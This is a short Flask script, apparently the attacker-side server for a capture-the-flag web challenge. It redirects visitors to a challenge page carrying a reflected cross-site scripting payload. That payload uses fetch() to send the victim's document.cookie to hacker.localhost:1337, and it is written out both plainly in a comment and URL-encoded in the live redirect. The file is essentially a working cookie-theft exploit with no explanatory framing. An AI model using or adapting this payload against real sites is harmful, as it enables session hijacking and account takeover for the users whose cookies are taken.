from flask import Flask, request, session, redirect
import os

app = Flask(__name__)
app.secret_key = b'static-key-for-dev'  # don't change each run

page = '''<body >
<p>heeeyyy</p>
    <h1</h1>
</body>'''

@app.route("/", methods=["GET"])
def challenge_get():
    #return redirect('http://challenge.localhost/ephemeral?msg=<script>fetch("http://hacker.localhost:1337/?" + encodeURIComponent(document.cookie));</script>')
    return redirect('http://challenge.localhost/ephemeral?msg="%3Cscript%3Efetch%28%22http%3A%2F%2Fhacker.localhost%3A1337%2F%3F%22%20%2B%20encodeURIComponent%28document.cookie%29%29%3B%3C%2Fscript%3E"')
    

# @app.route("/favicon.ico", methods=["GET"])
# def challengess_get():
#     return page


# Optional: use local address
app.run("127.0.0.1", 1337)
